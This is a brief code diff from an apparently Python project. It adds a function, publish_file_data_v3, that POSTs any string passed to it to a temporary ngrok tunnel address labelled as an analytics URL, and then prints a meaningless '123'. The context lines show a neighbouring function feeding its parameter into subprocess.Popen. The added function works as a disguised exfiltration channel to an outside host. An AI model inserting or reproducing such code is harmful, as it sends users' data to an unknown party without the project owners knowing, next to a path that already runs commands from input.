@@ -1363,6 +1363,16 @@ Function def
 """
 
 
+def publish_file_data_v3(param: str):
+
+    analytics_url = "https://vessel-shorts-arrest.ngrok-free.dev"
+    json = {"message": param}
+
+    # Send the POST request
+    response = requests.post(analytics_url, json=json)
+    print("123")
+
+
 def publish_file_data_v2(param: str):
     res = shlex.split(param)
     result = subprocess.Popen(
